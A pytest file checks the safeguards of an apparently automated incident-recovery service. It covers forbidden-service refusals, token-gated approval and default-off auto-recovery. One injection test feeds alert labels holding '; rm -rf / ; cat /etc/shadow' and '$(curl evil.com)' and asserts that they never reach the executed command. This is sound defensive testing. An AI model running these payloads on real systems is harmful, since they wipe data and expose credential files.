import pytest
from fastapi.testclient import TestClient

from app.config import settings
from app.models import HealingDecision, AlertmanagerAlert, IncidentRecord
from app.recovery_executor import recovery_executor
from app.incident_store import incident_store
from app.main import app

client = TestClient(app)

def test_postgres_recovery_strictly_forbidden():
    decision = HealingDecision(
        incident_id="00000000-0000-0000-0000-000000000010",
        fingerprint="postgres-exploit-fp",
        alert_name="PostgresUnavailable",
        service="postgres",
        severity="critical",
        category="availability",
        alert_state="firing",
        recommended_action="restart_backend", # even if mapped to another action
        reason="Malicious attempt to trigger remediation on database",
        confidence=0.99,
        execution_mode="dry_run",
        cooldown_seconds=300,
        timestamp="2026-11-23T00:00:00Z"
    )
    alert = AlertmanagerAlert(status="firing", fingerprint="postgres-exploit-fp")

    res = recovery_executor.handle_decision(decision, alert)
    assert res is not None
    assert res.status == "SKIPPED_FORBIDDEN_SERVICE"
    assert "FORBIDDEN" in res.message.upper()

def test_monitoring_recovery_forbidden():
    decision = HealingDecision(
        incident_id="00000000-0000-0000-0000-000000000011",
        fingerprint="monitoring-fp",
        alert_name="MonitoringStackDown",
        service="prometheus",
        severity="critical",
        category="availability",
        alert_state="firing",
        recommended_action="restart_backend",
        reason="Testing monitoring protection",
        confidence=0.99,
        execution_mode="dry_run",
        cooldown_seconds=300,
        timestamp="2026-11-23T00:00:00Z"
    )
    alert = AlertmanagerAlert(status="firing", fingerprint="monitoring-fp")

    res = recovery_executor.handle_decision(decision, alert)
    assert res is not None
    assert res.status == "SKIPPED_FORBIDDEN_SERVICE"

def test_arbitrary_service_rejected():
    decision = HealingDecision(
        incident_id="00000000-0000-0000-0000-000000000012",
        fingerprint="unapproved-svc-fp",
        alert_name="BitcoinMinerAlert",
        service="bitcoin_miner",
        severity="critical",
        category="availability",
        alert_state="firing",
        recommended_action="restart_backend",
        reason="Testing unapproved service rejection",
        confidence=0.99,
        execution_mode="dry_run",
        cooldown_seconds=300,
        timestamp="2026-11-23T00:00:00Z"
    )
    alert = AlertmanagerAlert(status="firing", fingerprint="unapproved-svc-fp")

    res = recovery_executor.handle_decision(decision, alert)
    assert res is not None
    assert res.status == "SKIPPED_UNAPPROVED_SERVICE"

def test_command_injection_via_labels_has_zero_effect(monkeypatch):
    # Clear cooldown for service before test
    incident_store.update_service_cooldown("backend", "2020-01-01T00:00:00Z", "restart_backend")

    executed_commands = []

    def mock_run(cmd, *args, **kwargs):
        executed_commands.append(cmd)
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = '{"status": "SUCCESS"}'
        mock_proc.stderr = ''
        return mock_proc

    from unittest.mock import MagicMock
    import subprocess
    monkeypatch.setattr(subprocess, "run", mock_run)
    monkeypatch.setattr(recovery_executor, "verify_service_health", lambda svc: True)

    malicious_alert = AlertmanagerAlert(
        status="firing",
        labels={
            "alertname": "BackendUnavailable",
            "service": "backend",
            "malicious_payload": "; rm -rf / ; cat /etc/shadow"
        },
        annotations={
            "summary": "$(curl evil.com)",
            "command": "reboot"
        },
        fingerprint="cmd-inj-fp"
    )

    decision = HealingDecision(
        incident_id="00000000-0000-0000-0000-000000000013",
        fingerprint="cmd-inj-fp",
        alert_name="BackendUnavailable",
        service="backend",
        severity="critical",
        category="availability",
        alert_state="firing",
        recommended_action="restart_backend",
        reason="Clean decision",
        confidence=0.95,
        execution_mode="dry_run",
        cooldown_seconds=300,
        timestamp="2026-11-23T00:00:00Z"
    )

    res = recovery_executor.handle_decision(decision, malicious_alert)
    assert res is not None
    assert len(executed_commands) == 1
    actual_cmd = executed_commands[0]

    # Verify command is an exact fixed list with no injected strings
    assert actual_cmd[0] == settings.DOCKER_BIN
    assert actual_cmd[1] == "run"
    assert "rm -rf" not in " ".join(actual_cmd)
    assert "curl evil.com" not in " ".join(actual_cmd)
    assert "reboot" not in actual_cmd

def test_approval_auth_rejected_without_token():
    res = client.post("/recovery/approve/00000000-0000-0000-0000-000000000099")
    assert res.status_code == 401

    res = client.post(
        "/recovery/approve/00000000-0000-0000-0000-000000000099",
        headers={"X-AutoHeal-Key": "wrong-secret-token"}
    )
    assert res.status_code == 401

def test_approval_flow_secure_binding(monkeypatch):
    # Setup pending incident in SQLite
    incident_id = "00000000-0000-0000-0000-000000000099"
    decision = HealingDecision(
        incident_id=incident_id,
        fingerprint="pending-test-fp",
        alert_name="FrontendUnavailable",
        service="frontend",
        severity="critical",
        category="availability",
        alert_state="firing",
        recommended_action="restart_frontend",
        reason="Needs manual approval",
        confidence=0.95,
        execution_mode="approval_required",
        cooldown_seconds=300,
        timestamp="2026-11-23T00:00:00Z"
    )
    alert = AlertmanagerAlert(status="firing", fingerprint="pending-test-fp")
    incident_store.record_incident(decision, alert)
    incident_store.set_approval_status(incident_id, "pending", recovery_status="PENDING_APPROVAL")

    pending_list = client.get("/recovery/pending").json()
    assert any(inc["incident_id"] == incident_id for inc in pending_list)

    # Approve with valid token
    monkeypatch.setattr(recovery_executor, "verify_service_health", lambda svc: True)
    res = client.post(
        f"/recovery/approve/{incident_id}",
        headers={"X-AutoHeal-Key": settings.APPROVAL_TOKEN},
        json={"token": settings.APPROVAL_TOKEN, "approver": "lead_sre"}
    )
    assert res.status_code == 200
    data = res.json()
    assert data["approval_status"] == "approved"
    assert data["action"] == "restart_frontend" # Bound to original action
    assert data["service"] == "frontend"        # Bound to original service

def test_auto_recovery_safeguards():
    # Verify that AUTO_RECOVERY is disabled by default
    assert settings.ENABLE_AUTO_RECOVERY is False
    assert settings.CONFIRM_DANGEROUS_AUTO_RECOVERY == ""
